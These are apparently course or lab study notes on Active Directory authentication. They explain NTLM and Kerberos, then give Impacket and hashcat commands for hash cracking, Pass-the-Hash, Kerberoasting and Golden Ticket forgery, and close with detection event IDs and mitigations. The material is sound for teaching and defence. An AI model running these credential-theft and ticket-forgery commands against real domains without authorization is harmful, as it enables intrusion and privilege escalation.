# Intro to AD Authentication 

## 1. Authentication vs Authorization

- **Authentication (AuthN):** Who are you? Passwords, hashes, tickets, certificates.
    
- **Authorization (AuthZ):** What can you access? Permissions, groups, ACLs.
    
- **NTLM:** Challenge-response authentication.
    
- **Kerberos:** Ticket-based authentication; default in modern AD.
    
- **SMB / LDAP:** Services and protocols that can use NTLM or Kerberos for authentication.
    

---

## 2. NTLM Authentication

### How It Works

1. Client requests access to a service.
    
2. Server sends a random challenge.
    
3. Client uses its password-derived NT hash to calculate a response.
    
4. Server forwards the challenge and response to the DC for verification.
    
5. DC verifies the response and returns the result.
    

**NTLMv1:** Insecure legacy version.  
**NTLMv2:** Stronger, but relay attacks remain possible when protections are missing.

### When Is NTLM Used?

- Kerberos is unavailable or fails.
    
- Access uses an IP address instead of a hostname.
    
- The service lacks a suitable SPN.
    
- The target is not domain-joined.
    
- Legacy applications require NTLM.
    

### Weaknesses

- No mutual authentication.
    
- Unsalted NT hashes allow fast offline password cracking.
    
- **Pass-the-Hash:** Authenticate using an NT hash without knowing the plaintext password.
    
- **NTLM Relay:** Relay authentication to another service when protections are insufficient.
    

### Authenticate to SMB with Impacket

```bash
smbclient.py 'DOMAIN/USER:PASSWORD'@TARGET_IP
```

Interactive commands:

```text
shares
use SHARE_NAME
```

## 3. Kerberos Authentication

### Key Components

|Component|Purpose|
|---|---|
|KDC|Key Distribution Center, usually running on the DC|
|TGT|Ticket Granting Ticket; used to request service tickets|
|TGS / ST|Service ticket for a specific service|
|SPN|Service Principal Name; identifies a service|
|`krbtgt`|Account whose secret key protects TGTs|

### Authentication Flow

1. **AS-REQ / AS-REP:** Initial authentication; client receives a TGT.
    
2. **TGS-REQ / TGS-REP:** Client uses the TGT to request a service ticket for an SPN.
    
3. **AP-REQ:** Client presents the service ticket to the target service.
    

### Weaknesses

- **Clock skew:** Kerberos commonly rejects requests when clocks differ by more than five minutes.
    
- **Pass-the-Ticket:** Reuse a stolen Kerberos ticket.
    
- **Kerberoasting:** Request service tickets and crack them offline.
    
- **Golden Ticket:** Forge TGTs using the compromised `krbtgt` secret.
    

**Fix clock skew in a lab:**

```bash
sudo ntpdate DC_IP
```

This requires `ntpdate` to be installed and the DC to provide a usable time service.

## 4. Kerberos with Impacket

**Remember:** Kerberos generally requires the target hostname and a matching SPN, not simply an IP address.

### Step 1 — Resolve the Target

```bash
echo "TARGET_IP SERVER1.domain.loc" | sudo tee -a /etc/hosts
```

### Step 2 — Request a TGT

```bash
getTGT.py domain.loc/USER:'PASSWORD' -dc-ip DC_IP
```

This typically saves a ticket cache such as `USER.ccache`.

### Step 3 — Load the Ticket

```bash
export KRB5CCNAME=USER.ccache
klist
```

### Step 4 — Authenticate to SMB

```bash
smbclient.py domain.loc/USER@SERVER1.domain.loc -k -no-pass -dc-ip DC_IP
```

- `-k` — use Kerberos authentication.
    
- `-no-pass` — do not prompt for a password.
    
- `-dc-ip` — specify the DC's IP address.
    
- `KRB5CCNAME` — selects the Kerberos credential cache.
    

**Pass-the-Ticket:** A valid stolen `.ccache` file may allow authentication without the account password.

## 5. Authentication Attacks 

### A. Crack an NTLM Hash

NTLM hash format:

```text
username:RID:LM_HASH:NT_HASH:::
```

Save the NT hash alone in `NT_HASH.txt`:

```bash
hashcat -m 1000 NT_HASH.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 NT_HASH.txt --show
```

- `-m 1000` — NTLM hash mode.
    
- `--show` — display recovered passwords.
    

### B. Pass-the-Hash (PtH)

**Concept:** Authenticate using the NT hash directly.

```bash
smbclient.py DOMAIN/USER@TARGET_IP \
-hashes aad3b435b51404eeaad3b435b51404ee:NT_HASH
```

The format is `LM_HASH:NT_HASH`. The `aad3b435...` value is the standard empty LM hash placeholder.

### C. Kerberoasting

**Concept:** Request service tickets for accounts with SPNs and attempt to crack them offline.

```bash
GetUserSPNs.py domain.loc/USER:'PASSWORD' -dc-ip DC_IP -request
```

Save the returned ticket hash in `TGS_HASH.txt`:

```bash
hashcat -m 13100 TGS_HASH.txt /usr/share/wordlists/rockyou.txt
```

**Hashcat mode `13100`:** Kerberos 5 TGS-REP etype 23 (RC4).

### D. Golden Ticket

**Concept:** Forge a TGT using the `krbtgt` NT hash and the domain SID.

```bash
ticketer.py -nthash KRBTGT_NT_HASH \
-domain-sid DOMAIN_SID \
-domain domain.loc Administrator
```

Load the generated ticket:

```bash
export KRB5CCNAME=Administrator.ccache
```

Authenticate to SMB:

```bash
smbclient.py domain.loc/Administrator@SERVER1.domain.loc \
-k -no-pass -dc-ip DC_IP
```

**Recovery:** After a confirmed `krbtgt` compromise, reset its password twice, allowing time for replication and ticket-related recovery procedures.

## 6. Windows Authentication Event IDs

|Event ID|Meaning|What to Investigate|
|---|---|---|
|**4624**|Successful logon|Authentication Package, Logon Type, source address|
|**4625**|Failed logon|Repeated failures, password spraying|
|**4768**|Kerberos TGT requested|Unusual requests and pre-authentication settings|
|**4769**|Kerberos service ticket requested|Unusual ticket-request volume; encryption type|
|**4771**|Kerberos pre-authentication failed|Password guessing and repeated failures|

### Detecting NTLM Activity

In Event `4624`, inspect:

- **Authentication Package:** `NTLM` or `Kerberos`.
    
- **Logon Type `3`:** Network logon.
    
- **Source Network Address:** Helps identify the originating host when available.
    

An NTLM network logon to a sensitive server deserves investigation, but it does not prove Pass-the-Hash by itself.

### Detecting Kerberoasting

Inspect Event `4769` for unusual service-ticket request patterns, especially bursts of requests from one account.

- **`0x17`** — RC4-HMAC.
    
- **`0x12`** — AES-256.
    

RC4 usage may be suspicious where AES is expected, but it is not proof of Kerberoasting on its own.

## 7. Mitigations — Blue Team

|Attack|Mitigation|
|---|---|
|Pass-the-Hash|Restrict NTLM where feasible; protect privileged credentials; use Protected Users where appropriate|
|NTLM Relay|Enforce SMB signing; enable EPA where supported|
|Kerberoasting|Use strong, unique service-account passwords or gMSAs|
|Golden Ticket|Protect the `krbtgt` secret; reset twice after compromise|
|Password Spraying|Use smart lockout or appropriate lockout policies; monitor failed logons|

**Core Workflow:** Identify the protocol → Find available credentials, hashes, or tickets → Test cracking or ticket-based attack paths → Authenticate to the target → Review relevant events and mitigations.
